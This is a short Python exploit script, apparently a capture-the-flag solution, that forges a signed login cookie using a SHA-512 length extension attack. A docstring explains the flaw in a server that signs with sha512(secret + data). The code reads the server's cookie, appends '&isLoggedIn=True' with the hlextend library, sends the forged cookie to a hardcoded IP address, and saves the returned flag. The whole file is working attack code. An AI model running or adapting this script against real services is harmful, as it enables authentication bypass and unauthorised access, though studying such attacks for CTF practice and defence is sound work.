from hlextend import hlextend
import base64
import hashlib
import os
import requests


'''
Computation of signature in server is vulnerable to length extension attacks.
The hash is computed as follows: sha512(secret + data)

The attacker can compute and restore the internal state of the hash function.
The attacker can then append data to the original data and compute the new hash without knowing the secret.
This is realized by the hlextend library.
'''

SERVER = "http://206.189.23.108:31285"

def info(msg):
    print("[*] " + msg)

def success(msg):
    print('\033[92m' + "[+] " + msg + '\033[0m')

def forged_cookie(known_data : str, known_hash : str):
    added_data = "&isLoggedIn=True"

    sha = hlextend.new('sha512')
    forged_data = sha.extend(
        added_data.encode(), 
        known_data.encode(), 
        16, 
        known_hash
    )

    forged_hash = sha.hexdigest().encode()
    return forged_data, forged_hash


sess = requests.session()
sess.get(SERVER + "/")

data, sig = sess.cookies.get("login_info").split(".")
data = base64.b64decode(data).decode()
sig = base64.b64decode(sig).decode()

info("old data: " + data)
info("old sig: " + sig)

print()

forged_data, forged_sig = forged_cookie(data, sig)
forged_cookie = base64.b64encode(forged_data).decode() + "." + base64.b64encode(forged_sig).decode()

info("forged data: " + str(forged_data))
info("forged sig: " + str(forged_sig))
success("forged cookie: " + forged_cookie)

info("Sending forged cookie...")
sess.cookies.clear()
sess.cookies.set("login_info", forged_cookie)
res = sess.get(SERVER + "/program", proxies={"http": "http://localhost:8080"})
with open("flag.pdf", "wb") as f:
    f.write(res.content)
    success("Done: Flag in flag.pdf :-)")

